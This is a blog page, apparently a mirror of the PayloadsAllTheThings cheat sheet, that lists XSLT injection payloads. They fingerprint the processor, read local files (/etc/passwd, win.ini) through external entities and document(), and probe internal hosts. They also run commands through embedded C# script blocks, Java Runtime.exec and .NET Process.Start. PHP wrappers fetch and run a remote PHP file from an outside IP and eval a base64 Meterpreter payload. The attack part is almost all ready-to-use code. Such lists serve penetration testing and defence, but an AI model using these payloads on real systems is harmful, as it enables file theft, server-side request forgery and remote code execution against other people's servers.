<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>XSLT Injection</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>XSLT Injection</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Thu, Dec 26, 2019, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Dec 26, 2019
  

  <i class="unloaded">2019-12-26T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="592 words">3 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h1 id="xslt-injection">XSLT Injection</h1>

<blockquote>
  <p>Processing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code</p>
</blockquote>

<h2 id="summary">Summary</h2>

<ul>
  <li><a href="#tools">Tools</a></li>
  <li><a href="#exploit">Exploit</a>
    <ul>
      <li><a href="#determine-the-vendor-and-version">Determine the vendor and version</a></li>
      <li><a href="#external-entity">External Entity</a></li>
      <li><a href="#read-files-and-ssrf-using-document">Read files and SSRF using document</a></li>
      <li><a href="#remote-code-execution-with-embedded-script-blocks">Remote Code Execution with Embedded Script Blocks</a></li>
      <li><a href="#remote-code-execution-with-php-wrapper">Remote Code Execution with PHP wrapper</a></li>
      <li><a href="#remote-code-execution-with-java">Remote Code Execution with Java</a></li>
      <li><a href="#remote-code-execution-with-native-net">Remote Code Execution with Native .NET</a></li>
    </ul>
  </li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="tools">Tools</h2>

<h2 id="exploit">Exploit</h2>

<h3 id="determine-the-vendor-and-version">Determine the vendor and version</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/fruits"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:vendor')"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/xsl:template&gt;</span>
<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;html</span> <span class="na">xsl:version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span><span class="nt">&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>Version: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:version')"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>Vendor: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:vendor')"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>Vendor URL: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:vendor-url')"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="external-entity">External Entity</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "C:\secretfruit.txt"&gt;</span>]&gt;
<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/fruits"</span><span class="nt">&gt;</span>
    Fruits <span class="ni">&amp;ext_file;</span>:
    <span class="c">&lt;!-- Loop for each fruit --&gt;</span>
    <span class="nt">&lt;xsl:for-each</span> <span class="na">select=</span><span class="s">"fruit"</span><span class="nt">&gt;</span>
      <span class="c">&lt;!-- Print name: description --&gt;</span>
      - <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"name"</span><span class="nt">/&gt;</span>: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"description"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/xsl:for-each&gt;</span>
  <span class="nt">&lt;/xsl:template&gt;</span>

<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="read-files-and-ssrf-using-document">Read files and SSRF using document</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/fruits"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;xsl:copy-of</span> <span class="na">select=</span><span class="s">"document('http://172.16.132.1:25')"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xsl:copy-of</span> <span class="na">select=</span><span class="s">"document('/etc/passwd')"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;xsl:copy-of</span> <span class="na">select=</span><span class="s">"document('file:///c:/winnt/win.ini')"</span><span class="nt">/&gt;</span>
    Fruits:
	    <span class="c">&lt;!-- Loop for each fruit --&gt;</span>
    <span class="nt">&lt;xsl:for-each</span> <span class="na">select=</span><span class="s">"fruit"</span><span class="nt">&gt;</span>
      <span class="c">&lt;!-- Print name: description --&gt;</span>
      - <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"name"</span><span class="nt">/&gt;</span>: <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"description"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/xsl:for-each&gt;</span>
  <span class="nt">&lt;/xsl:template&gt;</span>
<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="remote-code-execution-with-embedded-script-blocks">Remote Code Execution with Embedded Script Blocks</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
<span class="na">xmlns:msxsl=</span><span class="s">"urn:schemas-microsoft-com:xslt"</span>
<span class="na">xmlns:user=</span><span class="s">"urn:my-scripts"</span><span class="nt">&gt;</span>

<span class="nt">&lt;msxsl:script</span> <span class="na">language =</span> <span class="s">"C#"</span> <span class="na">implements-prefix =</span> <span class="s">"user"</span><span class="nt">&gt;</span>
<span class="cp">&lt;![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]&gt;</span>
<span class="nt">&lt;/msxsl:script&gt;</span>

  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/fruits"</span><span class="nt">&gt;</span>
  --- BEGIN COMMAND OUTPUT ---
	<span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"user:execute()"</span><span class="nt">/&gt;</span>
  --- END COMMAND OUTPUT ---	
  <span class="nt">&lt;/xsl:template&gt;</span>
<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="remote-code-execution-with-php-wrapper">Remote Code Execution with PHP wrapper</h3>

<p>Execute the function <code class="language-plaintext highlighter-rouge">readfile</code>.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;html</span> <span class="na">xsl:version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span><span class="nt">&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"php:function('readfile','index.php')"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Execute the function <code class="language-plaintext highlighter-rouge">scandir</code>.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;xsl:stylesheet</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;xsl:value-of</span> <span class="na">name=</span><span class="s">"assert"</span> <span class="na">select=</span><span class="s">"php:function('scandir', '.')"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/xsl:template&gt;</span>
<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Execute a remote php file using <code class="language-plaintext highlighter-rouge">assert</code></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;html</span> <span class="na">xsl:version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span><span class="nt">&gt;</span>
<span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"font-family:Arial;font-size:12pt;background-color:#EEEEEE"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"payload"</span><span class="nt">&gt;</span>
			include("http://10.10.10.10/test.php")
		<span class="nt">&lt;/xsl:variable&gt;</span>
		<span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"include"</span> <span class="na">select=</span><span class="s">"php:function('assert',$payload)"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Execute a PHP meterpreter using PHP wrapper.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;xsl:stylesheet</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"eval"</span><span class="nt">&gt;</span>
                        eval(base64_decode('Base64-encoded Meterpreter code'))
                <span class="nt">&lt;/xsl:variable&gt;</span>
                <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"preg"</span> <span class="na">select=</span><span class="s">"php:function('preg_replace', '/.*/e', $eval, '')"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/xsl:template&gt;</span>
<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="remote-code-execution-with-java">Remote Code Execution with Java</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>  <span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:rt=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span> <span class="na">xmlns:ob=</span><span class="s">"http://xml.apache.org/xalan/java/java.lang.Object"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"rtobject"</span> <span class="na">select=</span><span class="s">"rt:getRuntime()"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"process"</span> <span class="na">select=</span><span class="s">"rt:exec($rtobject,'ls')"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xsl:variable</span> <span class="na">name=</span><span class="s">"processString"</span> <span class="na">select=</span><span class="s">"ob:toString($process)"</span><span class="nt">/&gt;</span>
      <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"$processString"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/xsl:template&gt;</span>
  <span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;xml</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="err">?</span><span class="nt">&gt;</span>
<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"2.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:java=</span><span class="s">"http://saxon.sf.net/java-type"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
<span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')"</span> <span class="na">xmlns:Runtime=</span><span class="s">"java:java.lang.Runtime"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/xsl:template&gt;</span>.
<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="remote-code-execution-with-native-net">Remote Code Execution with Native .NET</h3>

<div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:msxsl=</span><span class="s">"urn:schemas-microsoft-com:xslt"</span> <span class="na">xmlns:App=</span><span class="s">"http://www.tempuri.org/App"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;msxsl:script</span> <span class="na">implements-prefix=</span><span class="s">"App"</span> <span class="na">language=</span><span class="s">"C#"</span><span class="nt">&gt;</span>
      <span class="cp">&lt;![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]&gt;</span>
    <span class="nt">&lt;/msxsl:script&gt;</span>
    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"ArrayOfTest"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;TABLE&gt;</span>
        <span class="nt">&lt;xsl:for-each</span> <span class="na">select=</span><span class="s">"Test"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;TR&gt;</span>
          <span class="nt">&lt;TD&gt;</span>
            <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"App:ToShortDateString(TestDate)"</span> <span class="nt">/&gt;</span>
          <span class="nt">&lt;/TD&gt;</span>
          <span class="nt">&lt;/TR&gt;</span>
        <span class="nt">&lt;/xsl:for-each&gt;</span>
      <span class="nt">&lt;/TABLE&gt;</span>
    <span class="nt">&lt;/xsl:template&gt;</span>
  <span class="nt">&lt;/xsl:stylesheet&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html">From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri</a></li>
  <li><a href="https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection">XSLT Injection - Fortify</a></li>
  <li><a href="https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/">XSLT Injection Basics - Saxon</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/injection/'>Injection</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/injection/"
            class="post-tag no-text-decoration" >Injection</a>
          
          <a href="/tags/xslt/"
            class="post-tag no-text-decoration" >XSLT</a>
          
          <a href="/tags/exploits/"
            class="post-tag no-text-decoration" >Exploits</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
